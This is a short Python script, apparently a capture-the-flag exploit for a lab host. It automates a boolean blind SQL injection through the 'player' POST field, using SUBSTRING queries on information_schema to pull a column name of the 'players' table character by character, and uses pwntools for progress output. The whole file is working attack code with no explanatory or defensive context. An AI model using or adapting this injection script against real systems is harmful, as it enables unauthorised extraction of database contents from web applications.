#!/usr/bin/env python3

import string

import pwn
import requests

URL = "http://10.10.11.128"
RED = "\033[0;31m"
RESET = "\033[0m"


def main():
    alphabet = string.ascii_letters + string.digits + string.punctuation
    password = ""
    match = True
    index = 1

    try:
        with pwn.log.progress("Current guess") as p:
            while match:
                p.status(f"{password}")
                for char in alphabet:
                    data = {
                        "player": f"test'OR SUBSTRING((SELECT column_name FROM information_schema.columns where table_name='players' LIMIT 1,1), {index}, 1) = '{char}' -- -"
                    }
                    r = requests.post(URL, data=data)

                    # Condition for match
                    if "ippsec" in r.text:
                        match = True
                        password += char
                        index += 1
                        break

                    match = False

            p.success(f"{password}")

    except KeyboardInterrupt:
        print(f"\n\n{RED}[-]{RESET} User Interrupted")


if __name__ == "__main__":
    main()
